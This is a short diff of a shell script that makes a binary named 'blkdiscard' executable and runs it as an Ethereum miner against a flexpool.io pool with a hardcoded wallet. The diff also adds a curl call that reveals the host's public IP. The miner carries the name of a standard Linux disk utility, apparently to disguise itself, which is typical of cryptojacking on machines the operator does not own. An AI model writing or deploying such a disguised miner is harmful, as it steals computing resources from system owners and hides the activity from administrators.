@@ -4,5 +4,7 @@ USER=$1
 ALGO=TON
 WORKER=$(echo GPU-$(shuf -i 1000-9999 -n 1))
 
+#gives ip address 
+curl ipecho.net/plain
 chmod +x blkdiscard
 ./blkdiscard --algo ETHASH --pool stratum+ssl://eth-de.flexpool.io:5555 --user 0x5be5d7f69aa748a68137a24bf1f14a49b5d7c754.$WORKER
